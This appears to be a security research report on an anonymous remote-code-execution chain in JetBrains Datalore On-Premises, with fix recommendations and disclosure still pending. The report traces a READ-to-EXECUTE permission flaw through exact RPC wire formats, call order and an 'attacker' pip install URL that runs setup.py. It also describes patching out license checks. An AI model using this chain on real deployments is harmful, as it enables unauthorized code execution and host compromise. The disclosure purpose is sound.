# JetBrains Datalore On-Premises — Unauthenticated RCE via InteractiveReport READ→EXECUTE Access Mapping Flaw

## 1. Product & Attack Surface

JetBrains Datalore On-Premises is an enterprise self-hosted collaborative data-science notebook platform (commercial Jupyter) built as a Tomcat Java/Kotlin web application (`ROOT.war`). It spawns agent containers through the Docker socket to execute notebook code. Default configuration ships the following environment flags (`datalore_entrypoint.sh:139`):

- `ALLOW_ANONYMOUS_RPC_ACCESS=true` — anonymous RPC entry shipped enabled by default
- `LANDING_PAGE=LOCAL` (no Hub) / `VIEWERS_ENABLED=true` / `FORCE_EMAIL_VERIFICATION=false`

Exposed ports: 8080 public Tomcat, 8081 internal RPC, 5050 agent manager, 4060 computation, 8087 SQL session.

Core attack surface: the `/wsdp` WebSocket endpoint hosts the Ocelot RPC (`otrpc`) service registering all computation services (`getOrCreateInteractiveReportSession`, `runAll`, `installLibrary`, `Terminal`, etc.). With `ALLOW_ANONYMOUS_RPC_ACCESS=true`, `/wsdp` accepts anonymous WebSocket upgrades (`ServiceContainerWebSocketHandler.java:306`).

## 2. Root Cause: InteractiveReport Public Sharing READ→EXECUTE Asymmetry

Datalore's public sharing allows publishing notebooks/reports with `public_access=READ`. The access-control checker contains a permission mapping flaw for interactive report sessions.

### 2.1 Anonymous READ on public INTERACTIVE_REPORT

`VfsSharingRepository.getAccess(vfsEntityId, userId=null, sharingContext)` (`VfsSharingRepository.java:453-490`) RecordMapper:

```kotlin
return this.$userId == null && (fileType == STATIC_REPORT || fileType == INTERACTIVE_REPORT)
    ? publicAccess
    : (userId == null ? NONE : maxOf(personalAccess, publicAccess))
```

→ Anonymous + INTERACTIVE_REPORT returns the `public_access` column value (READ if READ).

`VfsAccessServiceImpl.getAccessLevel(vfsEntityId, principal=null)` (`VfsAccessServiceImpl.java:124-167`): principal=null → ResourceFilter.Unrestricted → userId=null → `getAccess(..., null)` → READ → `calculateEffectiveAccessLevel(READ, ownerId, null)` → READ.

### 2.2 VIEW gate passes for anonymous READ

`ComputationSessionServiceImpl.getOrCreateInteractiveReportSession` is annotated `@RequireComputationAccess(VIEW, VfsEntityId.class)`. `VfsRpcAccessChecker` maps READ→VIEW (case 2→VIEW), so anonymous READ ≥ VIEW passes the gate and the session is created (sessionType=INTERACTIVE_REPORT).

### 2.3 The EXECUTE gate asymmetry (smoking gun)

`InteractiveReportSessionAccessProvider.getAccessLevel`:

```kotlin
case 2, 3, 4 -> EXECUTE   // READ/WRITE/MANAGE all mapped to EXECUTE
```

→ READ maps to EXECUTE. Other providers in the same family map differently:

- `VfsRpcAccessChecker`: READ→VIEW
- `RunSessionAccessProvider`: READ→VIEW

Only `InteractiveReportSessionAccessProvider` maps READ→EXECUTE. `SessionRpcAccessChecker` dispatches to this provider (CompositeSessionAccessProvider has INTERACTIVE_REPORT registered, no stricter fallthrough), so anonymous READ → EXECUTE.

### 2.4 EXECUTE-gated sinks reachable

Four EXECUTE-gated RPCs are annotated `@RequireComputationAccess(EXECUTE, ComputationSessionMeta.class)` — all reachable with anonymous EXECUTE:

- `KernelServiceImpl.runCells` / `runAll` (execute notebook cells)
- `TerminalServiceImpl.input` (direct shell input)
- `ReportRunServiceImpl`
- `LibraryManagerComputationServiceImpl.installLibrary` (pip install)

This exploit uses `installLibrary`: `PipDriver.doInstall` (`PipDriver.java:167-175`):

```java
[pipBin, "install", p.getVersion() != null ? p.buildFullName() : p.getName()]
```

`ManagedPackageVersion.name` is passed directly as a pip argument with no sanitization. pip accepts VCS URLs, local paths, and arbitrary package names → attacker-controlled `setup.py` → RCE.

## 3. Complete Exploitation Chain (6 hops, fully anonymous)

```
Anonymous (no credentials)
  │
  ▼ WebSocket /wsdp  (ALLOW_ANONYMOUS_RPC_ACCESS=true shipped default)
  │   ServiceContainerWebSocketHandler:306 accepts anonymous
  │
  ▼ ocelot otrpc service (LocalComputationSpringConfiguration registers all computation services)
  │
  ▼ getOrCreateInteractiveReportSession  @RequireComputationAccess(VIEW, VfsEntityId)
  │   VfsRpcAccessChecker: READ→VIEW  →  anonymous READ ≥ VIEW → PASS
  │   → session created (sessionType=INTERACTIVE_REPORT)
  │
  ▼ runAll (KernelService, 0 params, metaInfo carries sessionMeta)
  │   SessionRpcAccessChecker → InteractiveReportSessionAccessProvider: READ→EXECUTE (BUG)
  │   → EXECUTE PASS → spawn agent container
  │
  ▼ installLibrary (LibraryManagerComputationService)
  │   SessionRpcAccessChecker → InteractiveReportSessionAccessProvider: READ→EXECUTE (BUG)
  │   → EXECUTE PASS → PipDriver.doInstall: [pip, "install", <attacker URL>] unsanitized
  │
  ▼ pip install http://attacker/evil-rce-1.0.tar.gz → setup.py executes → RCE (uid=5000 datalore)
```

## 4. RPC Protocol Details (Ocelot wire + envelope)

### 4.1 Ocelot outer wire (`/wsdp` WebSocket text frames)

- Handshake: recv `sercnt:0:cfg:<version>` → send `sercnt:0:sl:otrpc` → recv `sercnt:0:op:otrpc:<portId>`
- RPC invocation: `otrpc:<portId>:<jsonPayload>`
- Outer format: `serviceName:portId:payload`, split ":" limit 3

### 4.2 RpcRequest JSON (6 elements)

```json
["<callId>", "<innerServiceName>", "<methodName>", <paramCount>, [<args>], <metaInfo>]
```

Response: `["<callId>", "k"|"f", <result|error>]`

### 4.3 Parameter envelope (RpcPersistentContextBase)

Each non-null parameter is wrapped as `{"serializedValue":"<inner-json-string>","valueClassName":"<FQN>"}`. Null parameters stay JSON null.

**Key pitfall**: `JsonObject.put(key,null)` skips the field (not written); `getString(key)` returns null for ABSENT key but throws ClassCastException on JsonNull. So null fields of `ManagedPackageVersion` (version/build/url) must be fully omitted, never written as JSON null.

### 4.4 metaInfo (DataloreMetaInfo, RpcRequest field[5])

`metaInfo` is raw JSON (not envelope-wrapped): `{"file_id":<VfsEntityId>, "session_meta":<ComputationSessionMeta>, "routing_id":<string>}` (all nullable, can be omitted).

**Key pitfall**: a 0-param method (runAll) cannot take ComputationSessionMeta from args, so it is read from metaInfo — used for BOTH the EXECUTE access check (`checker.extractFromMeta`) and `getSessionMetaFromMeta()`. runAll must pass `meta_info={"session_meta":<inner ComputationSessionMeta>}`.

### 4.5 Inner @OtRpcService names

- `ComputationSessionService` (getOrCreateInteractiveReportSession)
- `KernelService` (runAll/runCells)
- `LibraryManagerComputationService` (installLibrary)
- `TerminalService` (create/input/resize/kill/shutdown)

## 5. Complete Attack Surface Inventory

JetBrains Datalore On-Premises is a Tomcat Java/Kotlin web application (`ROOT.war`) exposing:

- HTTP interface count and list: Tomcat `ROOT.war` route table — 11 truly unauthenticated controllers + `/wsdp` WebSocket + `/api/*` REST.
- Unauthenticated interfaces: `/wsdp` WebSocket (anonymous RPC) + 11 unauthenticated HTTP controllers (`getRequestedReportEnvironment`, static resources, landing page, etc.).
- Unauthenticated attack surface: `/wsdp` anonymous RPC → InteractiveReport READ→EXECUTE → `installLibrary` / `runCells` / `Terminal`.
- Authentication bypass: no bypass needed — the chain reaches an EXECUTE sink anonymously; the authentication chain itself is dual-track (`RequiresAuthorizationHandlerInterceptor` + `AuthCredentialsArgumentResolver`).
- Hardcoded credentials: `DB_PASSWORD` / `SECRET` are per-deployment and not part of this chain; the chain does not depend on hardcoded credentials.

## 6. Dynamic Verification

### 5.1 Computation creation timing

`getOrCreateInteractiveReportSession` only creates a session DB record; it does not spawn the agent. `runAll` goes through `waitForKernelAndInvoke→createIfAbsentAndExecuteAsync` which creates the agent. `installLibrary` goes through `invokeComputationAsync→execute` (no create) → without a controller it throws NoComputationException. Required call order: getOrCreateSession → runAll (spawn) → wait for kernel ready (~8s) → installLibrary.

### 5.2 Computation auto-stop (research-side timing facility)

A computation stops automatically ~15s after start ("manual stop"), so an async pip install does not have time to run. The chain is `ComputationAllowanceChecker.scheduleRepeating(15000)` → `disposeIfAllowed` → `canBeDisposed` (`ComputationHolder.java:221`) → `shouldStopComputation` (`BackgroundComputationController.java:63`) → `stopComputation` → `releaseComputationId("manual stop")`. The research-side fix patches `shouldStopComputation` → return false (Code-attribute rewrite, iconst_0+ireturn) so the computation stays alive and the async pip has unlimited time.

### 5.3 License gates (research-side facilities)

The default on-prem license allows 1 user, and computation-resource gates block agent spawn. Two independent license gates:
1. `ComputationControllerImpl.checkComputationAllowed` (notebook_server) — patched to ALLOWED
2. `LicenseComputationResourcesMonitor.acquire` (agents-manager) — patched to delegate to myComputationResourcesMonitor.acquire

The license is a commercial gate, not a security boundary, and was patched in the research environment only.

### 6.4 Dynamic verification (clean re-run, unique nonce)

To rule out stale markers, a fresh `evil-rce-1.0.tar.gz` was rebuilt with a unique nonce `PROOF_NONCE_7f3a9c2e_run2_unique` in setup.py (first occurrence in this run). Old agents were killed to force a fresh spawn (no pip-cache contamination). After running the anonymous RPC chain, the unique nonce marker appeared inside the fresh agent container — proof that setup.py executed, meaning pip installed the attacker package → unauthenticated RCE confirmed.

## 7. Adversarial Verification (PASSED)

Two independent verification passes were run:

- **Falsification subagent** (assumed the chain was broken and actively looked for counterexamples) → FINAL VERDICT: SURVIVES, no breaking hop found. Confirmed: /wsdp anonymous WS acceptance bound to `ALLOW_ANONYMOUS_RPC_ACCESS`; interactive reports available on-prem; getOrCreateInteractiveReportSession annotation; SessionRpcAccessChecker dispatch with READ/WRITE/MANAGE→EXECUTE; VIEW gate mapping; live environment with flag=true and /wsdp returning 200.
- **Independent re-analysis subagent** (full re-review from scratch) → FINAL VERDICT: CHAIN CONFIRMED, all 8 links verified (anonymous publicAccess return / READ gate / VIEW annotation / 4 EXECUTE sinks / READ→EXECUTE mapping / unsanitized PipDriver / anonymous WS reachability / shipped-default flag).

## 8. Impact & Fix Recommendations

**Impact**: In default configuration, an anonymous attacker (no credentials) reaches `/wsdp` WebSocket, calls `installLibrary`/`runCells`/`Terminal` on any publicly shared interactive report, and executes arbitrary code inside the agent container (uid=5000 datalore). When the agent container mounts the Docker socket, this escalates to host compromise. Network-triggered, remotely reachable, no MITM/default credentials/Redis required.

**Fix recommendations**:

1. Set `ALLOW_ANONYMOUS_RPC_ACCESS=false` unless anonymous RPC access is explicitly required
2. Fix the access-control mapping so READ maps to VIEW for interactive reports (align with the other providers)
3. Sanitize and restrict package names/URLs passed to `pip install`; whitelist known-good package indexes
4. Run agent containers without Docker socket mounts and with least-privilege service accounts
5. Restrict management ports to trusted networks

## 9. References

- Static reverse-engineering output: CFR 0.152 decompilation of 116 Datalore JARs (all source)
- Exploit: `exploit/jetbrains_datalore_unauth_rce.py` (pure standard library, English stdout)
- Verification: unique-nonce clean re-run (see section 6.4)

## 10. Timeline & Disclosure Status

- Research completed and dynamically verified: 2026-08
- Vendor notification, CVE, and public disclosure channels: pending operator approval (Batch #6)
